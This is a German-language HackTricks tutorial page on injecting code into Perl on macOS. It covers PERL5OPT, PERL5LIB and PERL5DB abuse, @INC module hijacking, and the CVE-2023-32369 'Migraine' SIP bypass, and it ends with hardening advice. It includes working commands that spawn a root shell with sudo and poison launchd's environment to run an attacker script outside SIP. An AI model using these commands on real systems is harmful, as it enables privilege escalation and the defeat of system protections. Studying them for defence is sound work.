# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariable `PERL5OPT` & `PERL5LIB`

Mit der Umgebungsvariable **`PERL5OPT`** ist es möglich, dass **Perl** willkürliche Befehle ausführt, wenn der Interpreter startet (sogar **bevor** die erste Zeile des Zielskripts analysiert wird). 
Zum Beispiel, erstellen Sie dieses Skript:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Jetzt **exportiere die Umgebungsvariable** und führe das **perl**-Skript aus:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Eine weitere Möglichkeit besteht darin, ein Perl-Modul zu erstellen (z. B. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Und dann die Umgebungsvariablen verwenden, damit das Modul automatisch gefunden und geladen wird:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Andere interessante Umgebungsvariablen

* **`PERL5DB`** – wenn der Interpreter mit dem **`-d`** (Debugger) Flag gestartet wird, wird der Inhalt von `PERL5DB` als Perl-Code *innerhalb* des Debugger-Kontexts ausgeführt. Wenn Sie sowohl die Umgebung **als auch** die Befehlszeilenflags eines privilegierten Perl-Prozesses beeinflussen können, können Sie etwas wie Folgendes tun:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # wird eine Shell öffnen, bevor das Skript ausgeführt wird
```

* **`PERL5SHELL`** – unter Windows steuert diese Variable, welches Shell-Executable Perl verwendet, wenn es eine Shell starten muss. Sie wird hier nur der Vollständigkeit halber erwähnt, da sie unter macOS nicht relevant ist.

Obwohl `PERL5DB` den `-d` Schalter erfordert, ist es üblich, Wartungs- oder Installationsskripte zu finden, die als *root* mit diesem Flag aktiviert für ausführliche Fehlersuche ausgeführt werden, was die Variable zu einem gültigen Eskalationsvektor macht.

## Über Abhängigkeiten (@INC Missbrauch)

Es ist möglich, den Include-Pfad aufzulisten, den Perl durchsuchen wird (**`@INC`**), indem Sie Folgendes ausführen:
```bash
perl -e 'print join("\n", @INC)'
```
Typische Ausgaben auf macOS 13/14 sehen folgendermaßen aus:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Einige der zurückgegebenen Ordner existieren nicht einmal, jedoch existiert **`/Library/Perl/5.30`**, ist *nicht* durch SIP geschützt und befindet sich *vor* den SIP-geschützten Ordnern. Daher, wenn Sie als *root* schreiben können, können Sie ein bösartiges Modul (z.B. `File/Basename.pm`) ablegen, das *bevorzugt* von jedem privilegierten Skript, das dieses Modul importiert, geladen wird.

> [!WARNING]
> Sie benötigen immer noch **root**, um in `/Library/Perl` zu schreiben, und macOS zeigt ein **TCC**-Prompt an, das nach *Vollzugriff auf das Laufwerk* für den Prozess fragt, der die Schreiboperation durchführt.

Wenn ein Skript beispielsweise **`use File::Basename;`** importiert, wäre es möglich, `/Library/Perl/5.30/File/Basename.pm` zu erstellen, das vom Angreifer kontrollierten Code enthält.

## SIP-Umgehung über den Migrationsassistenten (CVE-2023-32369 “Migraine”)

Im Mai 2023 gab Microsoft **CVE-2023-32369** bekannt, mit dem Spitznamen **Migraine**, eine Post-Exploitation-Technik, die es einem *root*-Angreifer ermöglicht, **System Integrity Protection (SIP)** vollständig **zu umgehen**. 
Die verwundbare Komponente ist **`systemmigrationd`**, ein Daemon mit der Berechtigung **`com.apple.rootless.install.heritable`**. Jeder von diesem Daemon erzeugte Kindprozess erbt die Berechtigung und läuft daher **außerhalb** der SIP-Beschränkungen.

Unter den von den Forschern identifizierten Kindern befindet sich der von Apple signierte Interpreter:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Weil Perl `PERL5OPT` (und Bash `BASH_ENV`) respektiert, reicht es aus, die *Umgebung* des Daemons zu vergiften, um willkürliche Ausführung in einem SIP-losen Kontext zu erlangen:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wenn `migrateLocalKDC` ausgeführt wird, startet `/usr/bin/perl` mit dem bösartigen `PERL5OPT` und führt `/private/tmp/migraine.sh` *aus, bevor SIP wieder aktiviert wird*. Von diesem Skript aus können Sie beispielsweise einen Payload in **`/System/Library/LaunchDaemons`** kopieren oder das erweiterte Attribut `com.apple.rootless` zuweisen, um eine Datei **unlöschbar** zu machen.

Apple hat das Problem in macOS **Ventura 13.4**, **Monterey 12.6.6** und **Big Sur 11.7.7** behoben, aber ältere oder nicht gepatchte Systeme bleiben ausnutzbar.

## Empfehlungen zur Härtung

1. **Gefährliche Variablen löschen** – privilegierte launchdaemons oder Cron-Jobs sollten mit einer sauberen Umgebung gestartet werden (`launchctl unsetenv PERL5OPT`, `env -i` usw.).
2. **Vermeiden Sie es, Interpreter als root auszuführen**, es sei denn, es ist unbedingt notwendig. Verwenden Sie kompilierte Binärdateien oder entziehen Sie frühzeitig die Berechtigungen.
3. **Vendor-Skripte mit `-T` (Taint-Modus)**, damit Perl `PERL5OPT` und andere unsichere Schalter ignoriert, wenn die Taint-Prüfung aktiviert ist.
4. **Halten Sie macOS auf dem neuesten Stand** – “Migraine” ist in den aktuellen Versionen vollständig gepatcht.

## Referenzen

- Microsoft Security Blog – “Neue macOS-Sicherheitsanfälligkeit, Migraine, könnte den Systemintegritätsschutz umgehen” (CVE-2023-32369), 30. Mai 2023.
- Hackyboiz – “macOS SIP Bypass (PERL5OPT & BASH_ENV) Forschung”, Mai 2025.

{{#include ../../../banners/hacktricks-training.md}}
